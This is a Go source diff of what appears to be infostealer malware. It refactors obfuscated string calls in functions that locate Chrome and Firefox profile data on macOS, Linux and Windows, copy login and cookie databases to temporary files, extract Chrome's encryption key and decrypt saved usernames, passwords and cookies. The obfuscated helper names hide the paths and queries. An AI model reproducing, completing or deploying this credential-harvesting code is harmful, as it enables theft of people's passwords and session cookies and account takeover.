@@ -15,15 +15,13 @@ import (
 	"strings"
 	"sync"
 
-	"Cobra/EtaZzN"
+	"hash"
 
 	"github.com/Pallinder/go-randomdata"
 	_ "github.com/mattn/go-sqlite3"
 	"github.com/tidwall/gjson"
+	"golang.org/x/crypto/pbkdf2"
 )
-
-import "golang.org/x/crypto/pbkdf2"
-import "hash"
 
 func NewPbkdf2(password []byte, salt []byte, iter int, keyLen int, h func() hash.Hash) []byte {
 	return pbkdf2.Key(password, salt, iter, keyLen, h)
@@ -68,13 +66,13 @@ var (
 
 func browserInit() {
 	if !browserReady {
-		if runtime.GOOS == EtaZzN.X5YyCa19() {
+		if runtime.GOOS == X5YyCa19() {
 			secret, err := getChromeMacOS()
 			if err == nil {
-				chromeKey = NewPbkdf2([]byte(secret), []byte(EtaZzN.YzXUle2()), 1003, 16, sha1.New)
+				chromeKey = NewPbkdf2([]byte(secret), []byte(YzXUle2()), 1003, 16, sha1.New)
 			}
-		} else if runtime.GOOS == EtaZzN.MTnKnh20() {
-			chromeKey = NewPbkdf2([]byte(EtaZzN.Z2LnJI3()), []byte(EtaZzN.YzXUle2()), 1, 16, sha1.New)
+		} else if runtime.GOOS == MTnKnh20() {
+			chromeKey = NewPbkdf2([]byte(Z2LnJI3()), []byte(YzXUle2()), 1, 16, sha1.New)
 		}
 		browserReady = true
 	}
@@ -85,16 +83,16 @@ func getChromeLogins() []webLogins {
 	var LoginsFiles []string
 	var Logins []webLogins
 
-	if runtime.GOOS == EtaZzN.X5YyCa19() {
+	if runtime.GOOS == X5YyCa19() {
 
 		searchFor := []string{
-			normalizePath(EtaZzN.G6RF9X0()),
-			normalizePath(EtaZzN.Y7tVBP1()),
+			normalizePath(G6RF9X0()),
+			normalizePath(Y7tVBP1()),
 		}
 
 		for _, path := range searchFor {
 
-			results := walkSearch(EtaZzN.ZX4feL7(), path)
+			results := walkSearch(ZX4feL7(), path)
 			if results != nil {
 
 				LoginsFiles = append(LoginsFiles, results...)
@@ -103,17 +101,17 @@ func getChromeLogins() []webLogins {
 			}
 		}
 
-	} else if runtime.GOOS == EtaZzN.MTnKnh20() {
+	} else if runtime.GOOS == MTnKnh20() {
 
 		searchFor := []string{
-			normalizePath(EtaZzN.B1kaHz4()),
-			normalizePath(EtaZzN.Md4Eqe5()),
-			normalizePath(EtaZzN.UmVrzg6()),
+			normalizePath(B1kaHz4()),
+			normalizePath(Md4Eqe5()),
+			normalizePath(UmVrzg6()),
 		}
 
 		for _, path := range searchFor {
 
-			results := walkSearch(EtaZzN.ZX4feL7(), path)
+			results := walkSearch(ZX4feL7(), path)
 			if results != nil {
 
 				LoginsFiles = append(LoginsFiles, results...)
@@ -122,16 +120,16 @@ func getChromeLogins() []webLogins {
 			}
 		}
 
-	} else if runtime.GOOS == EtaZzN.PU6kUD18() {
+	} else if runtime.GOOS == PU6kUD18() {
 
 		searchFor := []string{
-			filepath.Join(os.Getenv(EtaZzN.VOjMIK8()), EtaZzN.Y1w7GT9()),
-			filepath.Join(os.Getenv(EtaZzN.VOjMIK8()), EtaZzN.SS6exn10()),
+			filepath.Join(os.Getenv(VOjMIK8()), Y1w7GT9()),
+			filepath.Join(os.Getenv(VOjMIK8()), SS6exn10()),
 		}
 
 		for _, path := range searchFor {
 
-			results := walkSearch(EtaZzN.ZX4feL7(), path)
+			results := walkSearch(ZX4feL7(), path)
 			if results != nil {
 
 				LoginsFiles = append(LoginsFiles, results...)
@@ -148,11 +146,11 @@ func getChromeLogins() []webLogins {
 
 		var logins []webLogins
 
-		if runtime.GOOS == EtaZzN.PU6kUD18() {
+		if runtime.GOOS == PU6kUD18() {
 
 			if !chromeWinReady {
 
-				LocalStatePATH := filepath.Join(strings.Split(LoginsPATH, string(filepath.Separator))[:8][1:]...) + string(filepath.Separator) + EtaZzN.OuZfym11()
+				LocalStatePATH := filepath.Join(strings.Split(LoginsPATH, string(filepath.Separator))[:8][1:]...) + string(filepath.Separator) + OuZfym11()
 				LocalStatePATH = strings.Split(LoginsPATH, string(filepath.Separator))[:8][:1][0] + string(filepath.Separator) + LocalStatePATH
 
 				if !fileExist(LocalStatePATH) {
@@ -161,9 +159,9 @@ func getChromeLogins() []webLogins {
 				}
 
 				s, _ := readFile(LocalStatePATH)
-				h := gjson.Get(s, EtaZzN.VUFV2s12())
+				h := gjson.Get(s, VUFV2s12())
 				if h.Exists() {
-					encryptedKey := h.Get(EtaZzN.RKyqPV13()).String()
+					encryptedKey := h.Get(RKyqPV13()).String()
 					if encryptedKey == "" {
 
 					}
@@ -190,7 +188,7 @@ func getChromeLogins() []webLogins {
 
 		for {
 
-			tmpDir = normalizePath(EtaZzN.N9ytHb14() + randomdata.RandStringRunes(7) + EtaZzN.EP3q1615())
+			tmpDir = normalizePath(N9ytHb14() + randomdata.RandStringRunes(7) + EP3q1615())
 			if _, err := os.Stat(tmpDir); err != nil {
 				break
 			}
@@ -206,13 +204,13 @@ func getChromeLogins() []webLogins {
 
 		if copyingResult {
 
-			db, err := sql.Open(EtaZzN.GAn49u16(), tmpDir)
+			db, err := sql.Open(GAn49u16(), tmpDir)
 			if err != nil {
 
 				return logins
 			}
 
-			rows, err := db.Query(EtaZzN.RuqIUh17())
+			rows, err := db.Query(RuqIUh17())
 			if err != nil {
 
 				return logins
@@ -237,7 +235,7 @@ func getChromeLogins() []webLogins {
 
 				var decryptedValue []byte
 
-				if runtime.GOOS == EtaZzN.PU6kUD18() {
+				if runtime.GOOS == PU6kUD18() {
 
 					iv := encryptedValue[3:15]
 					payload := encryptedValue[15:]
@@ -257,7 +255,7 @@ func getChromeLogins() []webLogins {
 
 				} else {
 					ver := string(encryptedValue)[:3]
-					if ver != EtaZzN.SOGmDn21() {
+					if ver != SOGmDn21() {
 						continue
 					}
 					encryptedValue = encryptedValue[3:]
@@ -330,15 +328,15 @@ func getfirefoxLogins() []webLogins {
 	var LoginsFiles []string
 	var Logins []webLogins
 
-	if runtime.GOOS == EtaZzN.X5YyCa19() {
+	if runtime.GOOS == X5YyCa19() {
 
 		searchFor := []string{
-			normalizePath(EtaZzN.Ei9zrm22()),
+			normalizePath(Ei9zrm22()),
 		}
 
 		for _, path := range searchFor {
 
-			results := walkSearch(EtaZzN.RLJebv23(), path)
+			results := walkSearch(RLJebv23(), path)
 			if results != nil {
 
 				LoginsFiles = append(LoginsFiles, results...)
@@ -347,15 +345,15 @@ func getfirefoxLogins() []webLogins {
 			}
 		}
 
-	} else if runtime.GOOS == EtaZzN.MTnKnh20() {
+	} else if runtime.GOOS == MTnKnh20() {
 
 		searchFor := []string{
-			normalizePath(EtaZzN.VFFVIi24()),
+			normalizePath(VFFVIi24()),
 		}
 
 		for _, path := range searchFor {
 
-			results := walkSearch(EtaZzN.RLJebv23(), path)
+			results := walkSearch(RLJebv23(), path)
 			if results != nil {
 
 				LoginsFiles = append(LoginsFiles, results...)
@@ -364,17 +362,17 @@ func getfirefoxLogins() []webLogins {
 			}
 		}
 
-	} else if runtime.GOOS == EtaZzN.PU6kUD18() {
+	} else if runtime.GOOS == PU6kUD18() {
 
 		searchFor := []string{
-			filepath.Join(os.Getenv(EtaZzN.XigTkw25()), EtaZzN.SApO0F28()),
-			filepath.Join(os.Getenv(EtaZzN.NUepLV26()), EtaZzN.SApO0F28()),
-			filepath.Join(os.Getenv(EtaZzN.VOjMIK8()), EtaZzN.MRZQfO27()),
+			filepath.Join(os.Getenv(XigTkw25()), SApO0F28()),
+			filepath.Join(os.Getenv(NUepLV26()), SApO0F28()),
+			filepath.Join(os.Getenv(VOjMIK8()), MRZQfO27()),
 		}
 
 		for _, path := range searchFor {
 
-			results := walkSearch(EtaZzN.RLJebv23(), path)
+			results := walkSearch(RLJebv23(), path)
 			if results != nil {
 
 				LoginsFiles = append(LoginsFiles, results...)
@@ -393,7 +391,7 @@ func getfirefoxLogins() []webLogins {
 
 		for {
 
-			tmpDir = normalizePath(EtaZzN.N9ytHb14() + randomdata.RandStringRunes(7) + EtaZzN.EP3q1615())
+			tmpDir = normalizePath(N9ytHb14() + randomdata.RandStringRunes(7) + EP3q1615())
 			if _, err := os.Stat(tmpDir); err != nil {
 				break
 			}
@@ -401,7 +399,7 @@ func getfirefoxLogins() []webLogins {
 		}
 
 		dir, _ := filepath.Split(LoginsPATH)
-		DecryptKeyPATH := filepath.Join(dir, EtaZzN.Sax7kM29())
+		DecryptKeyPATH := filepath.Join(dir, Sax7kM29())
 
 		copyingResult := fileCopy(DecryptKeyPATH, tmpDir)
 
@@ -426,17 +424,17 @@ func getfirefoxLogins() []webLogins {
 				return logins
 			}
 
-			h := gjson.GetBytes(s, EtaZzN.NmaONw30())
+			h := gjson.GetBytes(s, NmaONw30())
 			if h.Exists() {
 
 				for _, v := range h.Array() {
 
-					LoginURL := v.Get(EtaZzN.ZmvKDe31()).String()
-					user, err := profile.DecryptField(v.Get(EtaZzN.CAGYQa32()).String())
+					LoginURL := v.Get(ZmvKDe31()).String()
+					user, err := profile.DecryptField(v.Get(CAGYQa32()).String())
 					if err != nil {
 
 					}
-					pwd, err := profile.DecryptField(v.Get(EtaZzN.ZKcQNZ33()).String())
+					pwd, err := profile.DecryptField(v.Get(ZKcQNZ33()).String())
 					if err != nil {
 
 					}
@@ -493,42 +491,42 @@ func getfirefoxCookies() []webCookie {
 	var cookiesFiles []string
 	var webCookies []webCookie
 
-	if runtime.GOOS == EtaZzN.X5YyCa19() {
+	if runtime.GOOS == X5YyCa19() {
 
 		searchFor := []string{
-			normalizePath(EtaZzN.Ei9zrm22()),
+			normalizePath(Ei9zrm22()),
 		}
 
 		for _, path := range searchFor {
-			results := walkSearch(EtaZzN.BvpVia34(), path)
+			results := walkSearch(BvpVia34(), path)
 			if results != nil {
 				cookiesFiles = append(cookiesFiles, results...)
 			}
 		}
 
-	} else if runtime.GOOS == EtaZzN.MTnKnh20() {
+	} else if runtime.GOOS == MTnKnh20() {
 
 		searchFor := []string{
-			normalizePath(EtaZzN.VFFVIi24()),
+			normalizePath(VFFVIi24()),
 		}
 
 		for _, path := range searchFor {
-			results := walkSearch(EtaZzN.BvpVia34(), path)
+			results := walkSearch(BvpVia34(), path)
 			if results != nil {
 				cookiesFiles = append(cookiesFiles, results...)
 			}
 		}
 
-	} else if runtime.GOOS == EtaZzN.PU6kUD18() {
+	} else if runtime.GOOS == PU6kUD18() {
 
 		searchFor := []string{
-			filepath.Join(os.Getenv(EtaZzN.XigTkw25()), EtaZzN.SApO0F28()),
-			filepath.Join(os.Getenv(EtaZzN.NUepLV26()), EtaZzN.SApO0F28()),
-			filepath.Join(os.Getenv(EtaZzN.VOjMIK8()), EtaZzN.MRZQfO27()),
+			filepath.Join(os.Getenv(XigTkw25()), SApO0F28()),
+			filepath.Join(os.Getenv(NUepLV26()), SApO0F28()),
+			filepath.Join(os.Getenv(VOjMIK8()), MRZQfO27()),
 		}
 
 		for _, path := range searchFor {
-			results := walkSearch(EtaZzN.BvpVia34(), path)
+			results := walkSearch(BvpVia34(), path)
 			if results != nil {
 				cookiesFiles = append(cookiesFiles, results...)
 			}
@@ -544,7 +542,7 @@ func getfirefoxCookies() []webCookie {
 
 		for {
 
-			tmpDir = normalizePath(EtaZzN.N9ytHb14() + randomdata.RandStringRunes(7) + EtaZzN.EP3q1615())
+			tmpDir = normalizePath(N9ytHb14() + randomdata.RandStringRunes(7) + EP3q1615())
 			if _, err := os.Stat(tmpDir); err != nil {
 				break
 			}
@@ -562,12 +560,12 @@ func getfirefoxCookies() []webCookie {
 
 			var Cookies []webCookie
 
-			db, err := sql.Open(EtaZzN.GAn49u16(), tmpDir)
+			db, err := sql.Open(GAn49u16(), tmpDir)
 			if err != nil {
 				return Cookies
 			}
 
-			rows, err := db.Query(EtaZzN.KeuQP035())
+			rows, err := db.Query(KeuQP035())
 			if err != nil {
 				return Cookies
 			}
@@ -642,44 +640,44 @@ func getChromeCookies() []webCookie {
 	var cookiesFiles []string
 	var webCookies []webCookie
 
-	if runtime.GOOS == EtaZzN.X5YyCa19() {
+	if runtime.GOOS == X5YyCa19() {
 
 		searchFor := []string{
-			normalizePath(EtaZzN.G6RF9X0()),
-			normalizePath(EtaZzN.Y7tVBP1()),
+			normalizePath(G6RF9X0()),
+			normalizePath(Y7tVBP1()),
 		}
 
 		for _, path := range searchFor {
-			results := walkSearch(EtaZzN.MIhINU36(), path)
+			results := walkSearch(MIhINU36(), path)
 			if results != nil {
 				cookiesFiles = append(cookiesFiles, results...)
 			}
 		}
 
-	} else if runtime.GOOS == EtaZzN.MTnKnh20() {
+	} else if runtime.GOOS == MTnKnh20() {
 
 		searchFor := []string{
-			normalizePath(EtaZzN.B1kaHz4()),
-			normalizePath(EtaZzN.Md4Eqe5()),
-			normalizePath(EtaZzN.UmVrzg6()),
+			normalizePath(B1kaHz4()),
+			normalizePath(Md4Eqe5()),
+			normalizePath(UmVrzg6()),
 		}
 
 		for _, path := range searchFor {
-			results := walkSearch(EtaZzN.MIhINU36(), path)
+			results := walkSearch(MIhINU36(), path)
 			if results != nil {
 				cookiesFiles = append(cookiesFiles, results...)
 			}
 		}
 
-	} else if runtime.GOOS == EtaZzN.PU6kUD18() {
+	} else if runtime.GOOS == PU6kUD18() {
 
 		searchFor := []string{
-			filepath.Join(os.Getenv(EtaZzN.VOjMIK8()), EtaZzN.Y1w7GT9()),
-			filepath.Join(os.Getenv(EtaZzN.VOjMIK8()), EtaZzN.SS6exn10()),
+			filepath.Join(os.Getenv(VOjMIK8()), Y1w7GT9()),
+			filepath.Join(os.Getenv(VOjMIK8()), SS6exn10()),
 		}
 
 		for _, path := range searchFor {
-			results := walkSearch(EtaZzN.MIhINU36(), path)
+			results := walkSearch(MIhINU36(), path)
 			if results != nil {
 				cookiesFiles = append(cookiesFiles, results...)
 			}
@@ -693,11 +691,11 @@ func getChromeCookies() []webCookie {
 
 		var Cookies []webCookie
 
-		if runtime.GOOS == EtaZzN.PU6kUD18() {
+		if runtime.GOOS == PU6kUD18() {
 
 			if !chromeWinReady {
 
-				LocalStatePATH := filepath.Join(strings.Split(cookiePATH, string(filepath.Separator))[:8][1:]...) + string(filepath.Separator) + EtaZzN.OuZfym11()
+				LocalStatePATH := filepath.Join(strings.Split(cookiePATH, string(filepath.Separator))[:8][1:]...) + string(filepath.Separator) + OuZfym11()
 				LocalStatePATH = strings.Split(cookiePATH, string(filepath.Separator))[:8][:1][0] + string(filepath.Separator) + LocalStatePATH
 
 				if !fileExist(LocalStatePATH) {
@@ -706,9 +704,9 @@ func getChromeCookies() []webCookie {
 				}
 
 				s, _ := readFile(LocalStatePATH)
-				h := gjson.Get(s, EtaZzN.VUFV2s12())
+				h := gjson.Get(s, VUFV2s12())
 				if h.Exists() {
-					encryptedKey := h.Get(EtaZzN.RKyqPV13()).String()
+					encryptedKey := h.Get(RKyqPV13()).String()
 					if encryptedKey == "" {
 
 					}
@@ -736,7 +734,7 @@ func getChromeCookies() []webCookie {
 
 		for {
 
-			tmpDir = normalizePath(EtaZzN.N9ytHb14() + randomdata.RandStringRunes(7) + EtaZzN.EP3q1615())
+			tmpDir = normalizePath(N9ytHb14() + randomdata.RandStringRunes(7) + EP3q1615())
 			if _, err := os.Stat(tmpDir); err != nil {
 				break
 			}
@@ -752,12 +750,12 @@ func getChromeCookies() []webCookie {
 
 		if copyingResult {
 
-			db, err := sql.Open(EtaZzN.GAn49u16(), tmpDir)
+			db, err := sql.Open(GAn49u16(), tmpDir)
 			if err != nil {
 				return Cookies
 			}
 
-			rows, err := db.Query(EtaZzN.YfyBWY37())
+			rows, err := db.Query(YfyBWY37())
 			if err != nil {
 				return Cookies
 			}
@@ -785,7 +783,7 @@ func getChromeCookies() []webCookie {
 
 				var decryptedValue []byte
 
-				if runtime.GOOS == EtaZzN.PU6kUD18() {
+				if runtime.GOOS == PU6kUD18() {
 
 					iv := encryptedValue[3:15]
 					payload := encryptedValue[15:]
@@ -805,7 +803,7 @@ func getChromeCookies() []webCookie {
 
 				} else {
 					ver := string(encryptedValue)[:3]
-					if ver != EtaZzN.SOGmDn21() {
+					if ver != SOGmDn21() {
 						continue
 					}
 					encryptedValue = encryptedValue[3:]
